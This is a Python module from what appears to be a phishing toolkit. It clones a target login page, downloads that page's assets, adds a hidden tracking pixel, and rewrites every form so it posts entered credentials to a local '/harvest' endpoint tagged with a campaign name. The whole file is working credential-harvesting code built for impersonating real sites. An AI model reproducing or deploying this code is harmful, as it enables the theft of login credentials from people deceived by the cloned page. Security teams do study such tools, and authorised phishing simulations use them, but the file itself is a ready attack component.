import os
import re
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from modules.utils import log_event, color
from modules import config

BASE_DIR = os.path.join(os.path.dirname(__file__), "..", "data", "cloned_pages")

HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
    )
}


def clone_page(url: str, campaign: str):
    """Clone a target page, inject harvester form action, save locally."""
    out_dir    = os.path.join(BASE_DIR, campaign)
    assets_dir = os.path.join(out_dir, "assets")
    os.makedirs(assets_dir, exist_ok=True)

    log_event(campaign, "INFO", f"Cloning: {url}")

    try:
        resp = requests.get(url, headers=HEADERS, timeout=10)
        resp.raise_for_status()
    except requests.RequestException as e:
        log_event(campaign, "ERROR", f"Failed to fetch page: {e}")
        return

    soup     = BeautifulSoup(resp.text, "html.parser")
    base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"

    # ── Check for login form before doing any work ─────────────────────────────
    forms = soup.find_all("form")
    has_login_form = _detect_login_form(forms)

    if not forms:
        log_event(campaign, "WARN", "No <form> found on this page.")
        _prompt_continue(campaign) or _abort(campaign, out_dir)
        return
    elif not has_login_form:
        log_event(campaign, "WARN", "Forms found but none look like a login form (no password field).")
        _prompt_continue(campaign) or _abort(campaign, out_dir)

    # ── Download assets (CSS, JS, images) ─────────────────────────────────────
    _download_assets(soup, base_url, assets_dir, campaign)

    # ── Follow CSS @import rules ───────────────────────────────────────────────
    _follow_css_imports(assets_dir, base_url, campaign)

    # ── Inject tracking pixel ──────────────────────────────────────────────────
    pixel = soup.new_tag(
        "img", src="/track/open", width="1", height="1",
        style="display:none"
    )
    if soup.body:
        soup.body.append(pixel)

    # ── Inject form action ─────────────────────────────────────────────────────
    injected = 0
    for form in forms:
        form["action"] = "/harvest"
        form["method"] = "POST"
        hidden = soup.new_tag("input", type="hidden", name="_campaign", value=campaign)
        form.append(hidden)
        injected += 1

    log_event(campaign, "INFO", f"Injected /harvest action into {injected} form(s)")

    # ── Save final HTML ────────────────────────────────────────────────────────
    out_path = os.path.join(out_dir, "index.html")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(str(soup))

    log_event(campaign, "INFO", f"Saved → {out_path}")
    print(color(f"\n[✓] Clone complete: {out_path}\n", "green"))


# ── Helpers ────────────────────────────────────────────────────────────────────

def _detect_login_form(forms) -> bool:
    """Return True if any form contains a password input."""
    for form in forms:
        if form.find("input", {"type": "password"}):
            return True
    return False


def _prompt_continue(campaign: str) -> bool:
    """Ask user whether to continue despite warning. Returns True to continue."""
    ans = input(color("[?] Continue anyway? (y/N): ", "yellow")).strip().lower()
    if ans == "y":
        log_event(campaign, "WARN", "Continuing at user request — manual form injection may be needed.")
        return True
    return False


def _abort(campaign: str, out_dir: str):
    import shutil
    log_event(campaign, "INFO", "Aborted. Cleaning up.")
    shutil.rmtree(out_dir, ignore_errors=True)


def _download_assets(soup, base_url: str, assets_dir: str, campaign: str):
    """Download CSS, JS, and image assets and rewrite src/href to local paths."""
    tags = {
        "link":   "href",
        "script": "src",
        "img":    "src",
    }
    for tag, attr in tags.items():
        for el in soup.find_all(tag):
            src = el.get(attr)
            if not src or src.startswith("data:") or src.startswith("#"):
                continue

            asset_url = urljoin(base_url, src)
            filename  = _safe_filename(urlparse(asset_url).path.split("/")[-1])
            if not filename:
                continue

            local_path = os.path.join(assets_dir, filename)
            if not os.path.exists(local_path):
                _download_file(asset_url, local_path)

            el[attr] = f"assets/{filename}"


def _follow_css_imports(assets_dir: str, base_url: str, campaign: str):
    """
    Scan downloaded CSS files for @import url(...) rules
    and download those nested stylesheets too.
    """
    for fname in os.listdir(assets_dir):
        if not fname.endswith(".css"):
            continue

        css_path = os.path.join(assets_dir, fname)
        with open(css_path, encoding="utf-8", errors="ignore") as f:
            css = f.read()

        imports = re.findall(r'@import\s+url\(["\']?([^"\')\s]+)["\']?\)', css)
        if not imports:
            continue

        for imp in imports:
            import_url = urljoin(base_url, imp)
            imp_filename = _safe_filename(urlparse(import_url).path.split("/")[-1])
            if not imp_filename:
                continue

            local_path = os.path.join(assets_dir, imp_filename)
            if not os.path.exists(local_path):
                if _download_file(import_url, local_path):
                    log_event(campaign, "INFO", f"CSS @import downloaded: {imp_filename}")

            # Rewrite the @import path in the parent CSS
            css = css.replace(imp, imp_filename)

        with open(css_path, "w", encoding="utf-8") as f:
            f.write(css)


def _download_file(url: str, dest: str) -> bool:
    """Download a file to dest. Returns True on success."""
    try:
        r = requests.get(url, headers=HEADERS, timeout=8)
        with open(dest, "wb") as f:
            f.write(r.content)
        return True
    except Exception:
        return False


def _safe_filename(name: str) -> str:
    """Sanitize a filename, stripping query strings and unsafe chars."""
    name = name.split("?")[0]  # strip query params
    return re.sub(r"[^\w.\-]", "_", name)[:100]
